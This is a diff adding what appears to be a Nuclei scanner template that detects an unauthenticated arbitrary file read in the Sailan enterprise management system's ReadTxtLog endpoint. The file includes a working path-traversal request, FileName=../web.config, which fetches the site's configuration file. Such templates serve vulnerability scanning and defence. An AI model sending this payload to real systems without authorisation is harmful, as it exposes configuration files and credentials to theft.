@@ -1,0 +1,20 @@
+id: sailan-ReadTxtLog-fileread
+info:
+  name: 赛蓝企业管理系统ReadTxtLog存在任意文件读取漏洞
+  author: wangzong
+  severity: high
+  description: 赛蓝企业管理系统 ReadTxtLog 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E8%B5%9B%E8%93%9D%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReadTxtLog%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/BaseModule/SysLog/ReadTxtLog?FileName=../web.config"
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
